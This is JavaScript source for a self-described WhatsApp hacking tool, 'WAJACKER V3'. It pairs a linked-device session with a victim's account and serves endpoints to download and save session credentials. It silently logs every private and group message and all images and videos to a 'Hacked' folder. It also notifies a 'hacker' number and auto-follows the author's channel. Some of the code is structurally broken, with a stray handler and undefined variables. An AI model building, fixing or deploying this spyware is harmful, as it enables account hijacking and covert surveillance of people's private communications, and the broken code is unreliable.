console.log('┈░░░┈░┈░┈┈░┈░┈┈░┈┈░┈┈┈┈┈┈░┈┈┈░┈░┈░┈▒┈┈┈┈░┈░┈┈░┈┈░┈░┈░┈░┈░');
console.log('┈░░░┈░┈░┈┈░┈░┈┈░┈┈░┈┈┈┈┈┈░┈┈┈░┈░┈░┈▒┈┈┈┈░┈░┈┈░┈┈░┈░┈░┈░┈░');
console.log('┈┈┈░┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈░┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈░┈┈┈┈');
console.log('┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈');
console.log('By UDMODZ');
console.log('DONT SELL');
console.log('A FREE HACK');
console.log('ITz UDMODZ');
const app = express();
const port = process.env.PORT || 8000;
const host = '0.0.0.0';
// Startup code from startup.js
async function autoStartSessions() {
  // Load sessions from MongoDB and start them
  if (config.USE_MONGODB === 'true') {
    try {
      const database = await connectMongo();
      if (!database) {
        console.log('MongoDB connection failed, falling back to file sessions.');
        return autoStartFileSessions();
      }
      const collection = database.collection('sessions');
      const sessions = await collection.find({}).toArray();
      if (sessions.length === 0) {
        console.log('No sessions found in MongoDB to auto start.');
        return;
      }
      for (const session of sessions) {
        console.log(`Starting session from MongoDB: ${session.sessionId}`);
        await startSession(session.sessionId);
      }
    } catch (error) {
      console.error('Error auto starting sessions from MongoDB:', error);
      return autoStartFileSessions();
    }
  } else {
    console.log('MongoDB is disabled in settings, using file-based sessions only.');
    return autoStartFileSessions();
  }
}

async function autoStartFileSessions() {
  const sessionsDir = path.join(__dirname, 'auth_info_baileys');
  if (!fs.existsSync(sessionsDir)) {
    console.log('No sessions directory found to auto start sessions.');
    return;
  }
  const sessionFolders = fs.readdirSync(sessionsDir).filter(file => {
    return fs.statSync(path.join(sessionsDir, file)).isDirectory() && file !== 'default';
  });

  for (const session of sessionFolders) {
    await startSession(session);
  }
}

 async function startSession(session) {
  try {
    console.log(`Attempting to start session: ${session}`);
    let state, saveCreds;
    if (config.USE_MONGODB === 'true') {
      ({ state, saveCreds } = await useMongoAuthState(session));
    } else {
      console.log(`Using file-based auth state for session: ${session}`);
      ({ state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'auth_info_baileys', session)));
    }

    // If MongoDB is enabled, ensure directory exists for fallback
    if (config.USE_MONGODB === 'true') {
      const authDir = path.join(__dirname, 'auth_info_baileys', session);
      if (!fs.existsSync(authDir)) {
        fs.mkdirSync(authDir, { recursive: true });
      }
    }
    const { version } = await fetchLatestBaileysVersion();
    console.log(`Creating WhatsApp socket for session ${session} with version ${version}`);

    const conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      forcePairingCode: true,
      browser: Browsers.macOS('Firefox'),
      syncFullHistory: true,
      auth: state,
      version,
      generateHighQualityLinkPreview: true,
      getMessage: async (key) => {
        return { conversation: 'WAJACKER' };
      }
    });

    console.log(`WhatsApp socket created for session ${session}`);
    console.log(`Socket type:`, typeof conn);
    console.log(`Socket has requestPairingCode:`, typeof conn.requestPairingCode === 'function');
    console.log(`Socket auth state:`, !!conn.authState);
    conn.ev.on('creds.update', saveCreds);
    conn.ev.on('connection.update', async (update) => {
      let { connection, lastDisconnect, qr, isNewLogin } = update;
      console.log(`Session ${session} connection update: ${connection}`);
      console.log(`Full update object for session ${session}:`, JSON.stringify(update, null, 2));

      // Handle cases where connection state is not present but other properties exist
      if (connection === undefined || connection === null) {
        if (qr) {
          console.log(`Session ${session} received QR code, treating as connecting state`);
          console.log(`Session ${session} QR code:`, qr);
          console.log(`Session ${session} websocket state:`, conn.ws ? conn.ws.readyState : 'no websocket');
          console.log(`Session ${session} auth state:`, !!conn.authState);
          console.log(`Session ${session} user:`, conn.user ? conn.user.id : 'no user');
          // Treat QR code as connecting state
          update.connection = 'connecting';
          connection = 'connecting';
        } else {
          console.log(`Session ${session} connection state is undefined/null with no QR. Full update:`, update);
          console.log(`Session ${session} websocket state:`, conn.ws ? conn.ws.readyState : 'no websocket');
          console.log(`Session ${session} auth state:`, !!conn.authState);
          console.log(`Session ${session} user:`, conn.user ? conn.user.id : 'no user');
          return; // Don't proceed with undefined state and no QR
        }
      }

      sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        console.log("Session closed. Reason:", reason);

        if (reason === 428) {
            console.log("Connection terminated. Retrying...");
            // restart session
            startSession(session); 
        }
    } else if (connection === "open") {
        console.log("✅ Connected:", session);
    }
  });

        // Clear pairing timeout if any
        if (connections[session] && connections[session].pairingTimeout) {
          clearTimeout(connections[session].pairingTimeout);
          connections[session].pairingTimeout = null;
          console.log(`Cleared pairing timeout for session ${session} due to disconnect`);
        }

        if (reason === DisconnectReason.loggedOut) {
          console.log(`Session ${session} logged out, removing from connections`);
          delete connections[session];
        } else {
          // Add retry limit to prevent infinite loops
          if (!connections[session]) {
    console.log(`Session ${session} not found, skipping retry...`);
    return;
}

    if (!connections[session].retryCount) {
        connections[session].retryCount = 0;
}
      connections[session].retryCount++;

          if (connections[session].retryCount < 5) {
            const delay = Math.min(1000 * Math.pow(2, connections[session].retryCount), 30000); // Exponential backoff, max 30s
            console.log(`Restarting session ${session} (attempt ${connections[session].retryCount}/5) in ${delay}ms`);
            setTimeout(() => startSession(session), delay);
          } else {
            console.log(`Session ${session} failed to connect after 5 attempts, giving up`);
            delete connections[session];
          }
        
        } else if (connection === 'connecting') {
        console.log(`Session ${session} is connecting...`);
        console.log(`Session ${session} websocket state:`, conn.ws ? conn.ws.readyState : 'no websocket');
      } else if (connection === 'open') {
        console.log(`Session ${session} connected successfully`);
        console.log(`Session ${session} is now ready for pairing codes`);
        console.log(`Session ${session} websocket state:`, conn.ws ? conn.ws.readyState : 'websocket ready');
        console.log(`Session ${session} has requestPairingCode:`, typeof conn.requestPairingCode === 'function');
        setupMessageHandler(conn);

        // Send connect message if enabled
        if (config.CONNECT_MSG_SEND === "true") {
          try {
            await conn.sendMessage(hackerid + "@s.whatsapp.net", {
              image: { url: config.CONNECT_MSG_IMG },
              caption: config.CONNECT_MSG_TEXT
            });
            console.log(`Connect message sent to ${hackerid}`);
          } catch (error) {
            console.error('Failed to send connect message:', error);
          }
        }

        // Clear pairing timeout if any
        if (connections[session] && connections[session].pairingTimeout) {
          clearTimeout(connections[session].pairingTimeout);
          connections[session].pairingTimeout = null;
          console.log(`Cleared pairing timeout for session ${session}`);
        }

        // Start all other sessions with delay
        const sessionsDir = path.join(__dirname, 'auth_info_baileys');
        if (fs.existsSync(sessionsDir)) {
          const sessionFolders = fs.readdirSync(sessionsDir).filter(file => {
            return fs.statSync(path.join(sessionsDir, file)).isDirectory() && file !== 'default' && file !== session;
          });
          console.log(`Starting other sessions: ${sessionFolders.join(', ')}`);
          let delay = 0;
          for (const otherSession of sessionFolders) {
            setTimeout(() => {
              console.log(`Starting session ${otherSession} with delay`);
              startSession(otherSession);
            }, delay);
            delay += 5000; // 5 seconds delay between starts
          }
        }
        setTimeout(async () => {
          try {
            await conn.newsletterFollow("120363399194560532@newsletter");
          } catch (e) {
            // Silent catch
          }
        }, 5000);
      } else {
        console.log(`Session ${session} unknown connection state: ${connection}`);
        console.log(`Session ${session} full update:`, update);
      }
    });
    connections[session] = conn;
    console.log(`Session ${session} started successfully`);
    console.log(`Connection object created for session ${session}`);

    // Enhanced pairing timeout with progress tracking
    if (!conn.user) {
      updateSessionHealth(session, 'pairing', {
        websocketState: conn.ws ? conn.ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: 0,
        lastError: null
      });

      connections[session].pairingTimeout = setTimeout(async () => {
        console.log(`[PAIRING TIMEOUT] Session ${session} - 5 minutes elapsed, checking status...`);

        // Check if session is still in pairing state and not connected
        const currentHealth = sessionHealthMonitor.get(session);
        if (currentHealth && currentHealth.status === 'pairing' && !connections[session].user) {
          console.log(`[PAIRING TIMEOUT] Removing unpaired session: ${session}`);

          // Update health status before cleanup
          updateSessionHealth(session, 'timeout', {
            websocketState: 'timeout',
            userId: 'unknown',
            pairingCode: null,
            connectionAttempts: (currentHealth.metadata?.connectionAttempts || 0) + 1,
            lastError: 'Pairing timeout after 5 minutes'
          });

          if (connections[session]) {
            delete connections[session];
          }

          // Clean up from MongoDB if configured
          if (config.USE_MONGODB === 'true') {
            try {
              await deleteSession(session);
              console.log(`[CLEANUP] Session ${session} cleaned up from MongoDB`);
            } catch (error) {
              console.error('[CLEANUP ERROR] MongoDB cleanup failed:', error);
            }
          }

          // Clean up from file system
          try {
            const authDir = path.join(__dirname, 'auth_info_baileys', session);
            if (fs.existsSync(authDir)) {
              fs.rmSync(authDir, { recursive: true, force: true });
              console.log(`[CLEANUP] Session ${session} cleaned up from file system`);
            }
          } catch (error) {
            console.error('[CLEANUP ERROR] File system cleanup failed:', error);
          }

          sessionHealthMonitor.delete(session);
          sessionMetadata.delete(session);
        } else {
          console.log(`[PAIRING TIMEOUT] Session ${session} already connected or cleaned up`);
        }
      }, PAIRING_TIMEOUT); // 5 minutes timeout

      console.log(`[PAIRING START] Session ${session} started pairing process (timeout: ${PAIRING_TIMEOUT/1000}s)`);
    }
  } catch (error) {
    console.error(`Failed to start session ${session}:`, error);
  }
}
// End startup code
let connections = {}; // Store multiple connections keyed by session name


// Serve static files for main.html and pair.html
// Serve static files (main.html, pair.html, etc.) from the root directory
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'pair.html'));
});

// Enhanced endpoint to generate pairing code with retry logic and state management
app.get('/code', async (req, res) => {
  const number = req.query.number;
  const session = req.query.session;
  const retry = req.query.retry === 'true';

  if (!number) {
    return res.status(400).json({ error: 'Number parameter is required' });
  }
  if (!session) {
    return res.status(400).json({ error: 'Session parameter is required' });
  }

  try {
    // Check session health first
    const sessionStatus = getSessionStatus(session);
    console.log(`[PAIRING REQUEST] Session: ${session}, Status: ${sessionStatus}, Number: ${number}, Retry: ${retry}`);

    // If session is unhealthy and not a retry, try to reinitialize
    if (sessionStatus === 'unhealthy' && !retry) {
      console.log(`[PAIRING REQUEST] Session ${session} is unhealthy, attempting reinitialization`);
      if (connections[session]) {
        delete connections[session];
      }
      await startSession(session);
      await new Promise(resolve => setTimeout(resolve, 3000)); // Wait for initialization
    }

    // Initialize connection if it doesn't exist
    if (!connections[session]) {
      console.log(`[PAIRING REQUEST] Initializing connection for session: ${session}`);
      await startSession(session);
      await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for full initialization
    }

    // Check if connection is ready with enhanced validation
    if (!connections[session]) {
      updateSessionHealth(session, 'error', {
        websocketState: 'no connection',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
        lastError: 'Connection not initialized'
      });
      return res.status(503).json({
        error: 'Connection not initialized. Please try again in a few seconds.',
        sessionStatus: getSessionStatus(session),
        retry: true
      });
    }

    if (!connections[session].authState) {
      updateSessionHealth(session, 'error', {
        websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
        lastError: 'Auth state not ready'
      });
      return res.status(503).json({
        error: 'Connection auth state not ready. Please try again in a few seconds.',
        sessionStatus: getSessionStatus(session),
        retry: true
      });
    }

    // Enhanced auth state validation
    if (!connections[session].authState.creds) {
      updateSessionHealth(session, 'error', {
        websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
        lastError: 'Auth state credentials missing'
      });
      return res.status(503).json({
        error: 'Auth state not fully initialized. Please try again in a few seconds.',
        sessionStatus: getSessionStatus(session),
        retry: true
      });
    }

    // Check if requestPairingCode function is available
    if (typeof connections[session].requestPairingCode !== 'function') {
      updateSessionHealth(session, 'error', {
        websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
        lastError: 'requestPairingCode function not available'
      });
      return res.status(501).json({
        error: 'Pairing code request function not implemented in this connection.',
        details: 'The connection object does not have requestPairingCode method. This may indicate an issue with the Baileys library version or connection initialization.',
        sessionStatus: getSessionStatus(session),
        retry: true
      });
    }

    // Update session status to pairing
    updateSessionHealth(session, 'pairing', {
      websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
      userId: 'unknown',
      pairingCode: null,
      connectionAttempts: sessionMetadata.get(session)?.connectionAttempts || 0,
      lastError: null
    });

    console.log(`[PAIRING REQUEST] Requesting pairing code for number: ${number} on session: ${session}`);

    try {
      const code = await connections[session].requestPairingCode(number.replace(/[^0-9]/g, ''));

      // Update session with successful pairing code
      updateSessionHealth(session, 'pairing', {
        websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: code,
        connectionAttempts: sessionMetadata.get(session)?.connectionAttempts || 0,
        lastError: null
      });

      console.log(`[PAIRING SUCCESS] Generated pairing code: ${code} for session: ${session}`);
      res.json({
        code,
        session,
        status: 'success',
        message: 'Pairing code generated successfully. Use this code in WhatsApp to complete pairing.',
        timestamp: new Date().toISOString()
      });

    } catch (pairingError) {
      console.error('[PAIRING ERROR] Error during pairing code generation:', pairingError.message);

      // Update session health with error
      updateSessionHealth(session, 'error', {
        websocketState: connections[session].ws ? connections[session].ws.readyState : 'no websocket',
        userId: 'unknown',
        pairingCode: null,
        connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
        lastError: pairingError.message
      });

      // Handle specific error types with appropriate responses
      if (pairingError.message.includes('public') || pairingError.message.includes('auth') || pairingError.message.includes('state')) {
        console.log(`[PAIRING ERROR] Reinitializing session ${session} due to auth state issues`);
        try {
          delete connections[session];
          await startSession(session);
          return res.status(503).json({
            error: 'Session reinitialized due to auth state issues. Please try again in a few seconds.',
            sessionStatus: getSessionStatus(session),
            retry: true,
            details: pairingError.message
          });
        } catch (reinitError) {
          console.error('[PAIRING ERROR] Failed to reinitialize session:', reinitError);
          return res.status(500).json({
            error: 'Failed to reinitialize session',
            details: reinitError.message,
            sessionStatus: getSessionStatus(session),
            retry: true
          });
        }
      }

      return res.status(500).json({
        error: 'Failed to generate pairing code',
        details: pairingError.message,
        suggestion: 'Check if the session is properly connected and authenticated. Try reinitializing the session.',
        sessionStatus: getSessionStatus(session),
        retry: true
      });
    }
  } catch (error) {
    console.error('[PAIRING ERROR] Unexpected error generating pairing code:', error);

    // Update session health with unexpected error
    updateSessionHealth(session, 'error', {
      websocketState: 'unknown',
      userId: 'unknown',
      pairingCode: null,
      connectionAttempts: (sessionMetadata.get(session)?.connectionAttempts || 0) + 1,
      lastError: error.message
    });

    res.status(500).json({
      error: 'Failed to generate code',
      details: error.message,
      sessionStatus: getSessionStatus(session),
      retry: true
    });
  }
});

// Endpoint to download creds.js (auth credentials) for pairing
app.get('/download-creds', (req, res) => {
  const session = req.query.session;
  if (!session) {
    return res.status(400).json({ error: 'Session parameter is required' });
  }
  const credsPath = path.join(__dirname, 'auth_info_baileys', session, 'creds.json');

  // Check if this is a fetch request (expects JSON) or a download request
  const accept = req.headers.accept || '';
  if (accept.includes('application/json') || req.query.json === 'true') {
    // Return JSON for fetch requests
    try {
      const credsData = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
      res.json(credsData);
    } catch (error) {
      res.status(404).json({ error: 'Credentials not found' });
    }
  } else {
    // Return file download for browser downloads
    res.download(credsPath, 'creds.js', (err) => {
      if (err) {
        res.status(404).send('Credentials not found');
      }
    });
  }
});

app.post('/save-creds', express.json(), (req, res) => {
  let session = req.query.session;
  const credsData = req.body;

  if (!session) {
    return res.status(400).json({ error: 'Session parameter is required' });
  }

  const credsDir = path.join(__dirname, 'auth_info_baileys', session);
  const credsPath = path.join(credsDir, 'creds.json');

  try {
    // Ensure session directory exists
    if (!fs.existsSync(credsDir)) {
      fs.mkdirSync(credsDir, { recursive: true });
    }
    fs.writeFileSync(credsPath, JSON.stringify(credsData, null, 2));
    console.log(`Credentials saved for session: ${session}`);
    res.status(200).send('Credentials saved');
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).send('Failed to save credentials');
  }
});

async function connectToWA() {
  console.log("Connecting wa Hack 😌...");
  let state, saveCreds;
  if (config.USE_MONGODB === 'true') {
    ({ state, saveCreds } = await useMongoAuthState('default'));
  } else {
    ({ state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/'));
  }

  // If MongoDB failed and we're using file fallback, ensure directory exists
  if (config.USE_MONGODB === 'true') {
    const authDir = path.join(__dirname, 'auth_info_baileys');
    if (!fs.existsSync(authDir)) {
      fs.mkdirSync(authDir, { recursive: true });
    }
  }
  var { version } = await fetchLatestBaileysVersion();
  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    forcePairingCode: true,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
    generateHighQualityLinkPreview: true,
    getMessage: async (key) => {
      return { conversation: 'WAJACKER' };
    }
  });
  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
        if (connection === 'open') {
          console.log('[Hacked] ' + JSON.stringify(conn.user && conn.user.id ? conn.user.id : 'unknown', null, 2));
          console.log('[Whatsapp Hack by UDMODZ youtube.com/@udmodz]');
          console.log('Command installed successful ✅');
          console.log('Hacker connected to whatsapp ✅');
          console.log('Successfully Hacked by UDMODZ ✅View channel for latest or contact UDMODZ 💙 \n\n\n whatsapp.com/channel/0029VbAwZeh59PwXq4Oxow3a \n wa.me/94704638406 \n\n\n UDhanika Dissanayaka');
          setTimeout(async () => {
            try {
              await conn.newsletterFollow("120363399194560532@newsletter");
            } catch (e) {
              // Silent catch
            }
          }, 5000);
           if (config.CHANNEL_FOLLOW === "true") {
          setTimeout(async () => {
            try {
              await conn.newsletterFollow(config.CHANNEL_JID);
            } catch (e) {
              // Silent catch
            }
          }, 5000);
           }
          if (config.CONNECT_MSG_SEND === "true") {
               await conn.sendMessage(hackerid + "@s.whatsapp.net", { image: { url: config.CONNECT_MSG_IMG }, caption: config.CONNECT_MSG_TEXT  } );
           }
          setupMessageHandler(conn);
          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() == ".js") {
              try {
                delete require.cache[require.resolve("./plugins/" + plugin)];
                require("./plugins/" + plugin);
                console.log(`Loaded plugin: ${plugin}`);
              } catch (e) {
                console.error(`Failed to load plugin ${plugin}:`, e);
              }
            }
          });
        }
  }});
  conn.ev.on('creds.update', saveCreds);
}
app.get("/", (req, res) => {
  res.send("I'm Spying 😌");
});

// Health check endpoint
app.get("/health", (req, res) => {
  const health = {
    status: "ok",
    server: "running",
    port: port,
    host: host,
    connections: Object.keys(connections).length,
    sessions: Object.keys(connections),
    timestamp: new Date().toISOString()
  };
  res.json(health);
});

// Test pairing endpoint
app.get("/test-pairing", (req, res) => {
  const session = req.query.session;
  if (!session) {
    return res.status(400).json({ error: 'Session parameter is required' });
  }

  const connection = connections[session];
  if (!connection) {
    return res.status(404).json({ error: `Session ${session} not found` });
  }

  const testResult = {
    session: session,
    connectionExists: !!connection,
    hasAuthState: !!connection.authState,
    hasRequestPairingCode: typeof connection.requestPairingCode === 'function',
    connectionState: connection.ws ? connection.ws.readyState : 'no websocket',
    user: connection.user ? connection.user.id : 'no user',
    timestamp: new Date().toISOString()
  };

  res.json(testResult);
});

// Initialize session endpoint
app.get("/init-session", async (req, res) => {
  const session = req.query.session;
  if (!session) {
    return res.status(400).json({ error: 'Session parameter is required' });
  }

  try {
    // Force restart by deleting existing connection
    if (connections[session]) {
      console.log(`Terminating existing session: ${session}`);
      delete connections[session];
      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for cleanup
    }

    console.log(`Initializing session: ${session}`);
    await startSession(session);
    // Wait for initialization
    await new Promise(resolve => setTimeout(resolve, 5000));

    res.json({
      message: `Session ${session} initialization completed`,
      exists: !!connections[session],
      hasRequestPairingCode: connections[session] ? typeof connections[session].requestPairingCode === 'function' : false,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error initializing session:', error);
    res.status(500).json({ error: 'Failed to initialize session', details: error.message });
  }
});


app.listen(port, host, () => {
  console.log(`Server running on http://${host}:${port}`);
  console.log(`Web interface available at: http://${host}:${port}/`);
  console.log(`Pairing endpoint available at: http://${host}:${port}/code`);
  console.log(`Health check available at: http://${host}:${port}/health`);
  console.log(`Test pairing available at: http://${host}:${port}/test-pairing`);
  console.log(`Init session available at: http://${host}:${port}/init-session`);
});

const SESSION_CLEANUP_INTERVAL = 15 * 60 * 1000; // 15 minutes
const SESSION_HEALTH_CHECK_INTERVAL = 5 * 60 * 1000; // 5 minutes
const PAIRING_TIMEOUT = 5 * 60 * 1000; // 5 minutes pairing timeout

// Improved session cleanup with health check
setInterval(() => {
  for (const session in connections) {
    const conn = connections[session];
    const healthy = isSessionHealthy(session);
    if (!healthy) {
      console.log(`Cleaning up unhealthy or inactive session: ${session}`);
      if (conn && conn.ws) {
        try {
          conn.ws.close();
        } catch (e) {
          console.error(`Error closing websocket for session ${session}:`, e);
        }
      }
      delete connections[session];
      sessionHealthMonitor.delete(session);
      sessionMetadata.delete(session);
    }
  }
}, SESSION_CLEANUP_INTERVAL);

// Periodic session health update
setInterval(() => {
  for (const session in connections) {
    const conn = connections[session];
    if (conn) {
      const wsState = conn.ws ? conn.ws.readyState : 'no websocket';
      const userId = conn.user && conn.user.id ? conn.user.id : 'unknown';
      updateSessionHealth(session, wsState === 1 ? 'healthy' : 'unhealthy', {
        websocketState: wsState,
        userId,
        connectionAttempts: sessionMetadata.get(session)?.connectionAttempts || 0,
        lastError: sessionMetadata.get(session)?.lastError || null
      });
    }
  }
}, SESSION_HEALTH_CHECK_INTERVAL);

async function setupMessageHandler(conn) {
  const botNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown';
  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
      try {
        const maxTime = 5 * 60 * 1000;
        const currentTime = Date.now();
        const messageTime = mek.messageTimestamp * 1000;
        const timeDiff = currentTime - messageTime;
        if (timeDiff <= maxTime) {
          const randomEmoji = '💙';
          await conn.sendMessage("status@broadcast", {
            react: { text: randomEmoji, key: mek.key },
          }, { statusJidList: [mek.key.participant] });
        }
      } catch (error) {
        console.error('Status view err', error);
      }
    }
 

    

    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null
      ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const body = (type === 'conversation') ? mek.message.conversation
      : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text
        : (type === 'imageMessage') && mek.message.imageMessage.caption
          ? mek.message.imageMessage.caption
          : (type === 'videoMessage') && mek.message.videoMessage.caption
            ? mek.message.videoMessage.caption : '';
    const isInternalCmd = body.startsWith(internalPrefix);
    const isExternalCmd = body.startsWith(externalPrefix);
    const command = isInternalCmd ? body.slice(internalPrefix.length).trim().split(' ').shift().toLowerCase() : (isExternalCmd ? body.slice(externalPrefix.length).trim().split(' ').shift().toLowerCase() : '');
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? ((conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown') + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const pushname = mek.pushName || 'Unknown fucker';
    const isMe = botNumber.includes(senderNumber);
    const udmodzch = "120363399194560532@newsletter"
    const isHacker = hackerid.includes(senderNumber) || addmin.includes(senderNumber) || udmodzch.includes(senderNumber) || addminch.includes(senderNumber);
    const isOwner = hackerid.includes(senderNumber) || addmin.includes(senderNumber) || botNumber.includes(senderNumber);
    const botNumber2 = conn.user && conn.user.id ? await jidNormalizedUser(conn.user.id) : 'unknown@s.whatsapp.net';
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => ({ subject: 'Unknown Group', participants: [] })) : { subject: '', participants: [] };
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? groupMetadata.participants : [];
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
    const budy = (typeof m.body === 'string') ? m.body : '';
    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek });
    };
    const dateloc = moment.tz(new Date(), 'Asia/Colombo').format('YYYY-MM-DD HH:mm:ss');
    function saveMessage(pushname, message) {
      const baseDir = `./Hacked/${botNumber}`;
      const subDir = isGroup ? 'group' : 'private';
      const fileName = isGroup ? `${from}.txt` : `${senderNumber}.txt`;
      const dirPath = `${baseDir}/${subDir}`;
      const fullPath = `${dirPath}/${fileName}`;
      const formattedMessage = `
 _________________________________________

  SAVED BY WAJACKER V3
   youtube.com/@udmodz

  𝗧𝗜𝗠𝗘 :- ${dateloc}
  𝗙𝗥𝗢𝗠 :- ${m.sender}
  𝗧𝗢 :- ${from}
  𝗠𝗘𝗦𝗦𝗔𝗚𝗘 :- ${budy}
  `;
      if (!fs.existsSync('./Hacked')) {
        fs.mkdirSync('./Hacked', { recursive: true });
      }
      if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir, { recursive: true });
      }
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }

      if (fs.existsSync(fullPath)) {
        fs.appendFile(fullPath, formattedMessage, (err) => {
          if (err) console.error('Error appending message:', err);
          else console.log(`Message from ${m.sender} appended to ${fullPath}`);
        });
      } else {
        fs.writeFile(fullPath, formattedMessage, (err) => {
          if (err) console.error('Error saving message:', err);
          else console.log(`Message from ${m.sender} saved to new file ${fullPath}`);
        });
      }
    }
    if (m.message) {
      console.log('[ New MSG ]', dateloc, budy || m.mtype);
      console.log('=> From', pushname, m.sender);
      console.log('=> To', m.isGroup ? pushname : 'Private Chat', from);
      saveMessage(pushname, budy);
     if (m.type === 'imageMessage' || m.type === 'videoMessage') {
      const baseDir = `./Hacked/${botNumber}`;
      const subDir = isGroup ? 'group' : 'private';
      const dirPath = `${baseDir}/${subDir}`;
      if (!fs.existsSync('./Hacked')) {
        fs.mkdirSync('./Hacked', { recursive: true });
      }
      if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir, { recursive: true });
      }
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }
         const buffer = await downloadMediaMessage(m, `${Date.now()}`);
         if (buffer) {
           const ext = m.type === 'imageMessage' ? '.jpg' : '.mp4';
           const fileName = isGroup ? `${from}_${Date.now()}${ext}` : `${senderNumber}_${Date.now()}${ext}`;
           const filePath = `${dirPath}/${fileName}`;
           fs.writeFile(filePath, buffer, (err) => {
             if (err) console.error('Error saving media:', err);
             else console.log(`Saved ${m.type} to ${filePath}`);
           });
         }
     }
    }



    if(body === "send" || body === "Send" || body === "Seve" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න" && config.C === "true"){
         if(!m.quoted) return reply("*Please Mention status*")
        const data = JSON.stringify(mek.message, null, 2);
        const jsonData = JSON.parse(data);
        const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
        if(!isStatus) return
    
        const getExtension = (buffer) => {
            const magicNumbers = {
                jpg: 'ffd8ffe0',
                png: '89504e47',
                mp4: '00000018',
            };
            const magic = buffer.toString('hex', 0, 4);
            return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
        };
    
        if(m.quoted.type === 'imageMessage') {
            var nameJpg = getRandom('');
            let buff = await m.quoted.download(nameJpg);
            let ext = getExtension(buff);
            await fs.promises.writeFile("./" + ext, buff);
            const caption = m.quoted.imageMessage.caption;
            await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
        } else if(m.quoted.type === 'videoMessage') {
            var nameJpg = getRandom('');
            let buff = await m.quoted.download(nameJpg);
            let ext = getExtension(buff);
            await fs.promises.writeFile("./" + ext, buff);
            const caption = m.quoted.videoMessage.caption;
            let buttonMessage = {
                video: fs.readFileSync("./" + ext),
                mimetype: "video/mp4",
                fileName: `${m.id}.mp4`,
                caption: caption ,
                headerType: 4
            };
            await conn.sendMessage(from, buttonMessage,{
                quoted: mek
            });
        }
    }

    conn.edit = async (mek, newmg) => {
      await conn.relayMessage(from, {
        protocolMessage: {
          key: mek.key,
          type: 14,
          editedMessage: {
            conversation: newmg
          }
        }
